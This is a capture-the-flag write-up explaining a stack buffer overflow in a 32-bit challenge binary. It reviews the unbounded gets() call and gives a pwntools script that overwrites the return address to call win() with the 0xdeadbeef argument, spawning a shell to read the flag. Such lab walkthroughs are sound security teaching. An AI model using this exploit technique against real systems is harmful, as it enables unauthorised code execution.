# Reconnaissance
## C Review
We can clearly see that nothing is happening in the main function, so we'll look into `vuln()` for the attack vector. There is a 50 byte buffer we can write into with `gets()` without bounds checking, so that is our attack vector. We will want to overwrite the return address to call `win()` and spawn a shell, but `win()` is a little more complicated than it has been in previous attempts this time around. Inside of `win()` there is a check seeing if it's parameter `param` is equal to `0xdeadbeef`, so we will need to also use our input to provide that argument.

Using the file command we can also see that the binary was compiled on a 32-bit system, so the addresses we write should each be 4 bytes.

# Script
First let's do some setup:
```{python}
from pwn import *

path_to_binary = "./challenge/chall_9"
EXE = ELF(path_to_binary)
context.binary = EXE
context.log_level = "DEBUG"

win_address = EXE.symbols['win']

def conn(useExe=False):
	if useExe:
		# r = gdb.debug(EXE.path, "\n".join(breakpoints))
		r = process([EXE.path])
	else:
		r = remote('pwn.osucyber.club',13380)
	return r
```
We import the `pwn` library to use for the challenge, and use it's functionality to create an `ELF` object which will let us find some interesting information about the executable. Setting the context is necessary with `context.binary` to run the process locally, and adding the "DEBUG" setting just gives us more verbose output about what we send and receive. Next, we obtain the address of the `win()` function which we will want to write in place of the return address, and define a function which will let us easily switch betweeen running a local process and connecting to the remote server.

Now, lets construct our payload and send it:
```{python}
io = conn(False)
io.recvline()
io.sendline(b'bananas')

# Ghidra was used to decompile the file and find that the 50 byte buffer is actually taking up
# 62 bytes on the stack, so we need 62 bytes of padding to start. Then we add 4 bytes of padding
# between `win_address` and `0xdeadbeef` because the `win()` function expects a return address of 
# its own.
payload = 62 * b'a'
payload += p32(win_address) + b'aaaa' + p32(0xdeadbeef)

io.sendline(payload)

io.interactive()
io.close()
```

If this spawns a terminal, then our code worked! We can run it again on the server then call `ls` and `cat flag.txt` in the interactive shell!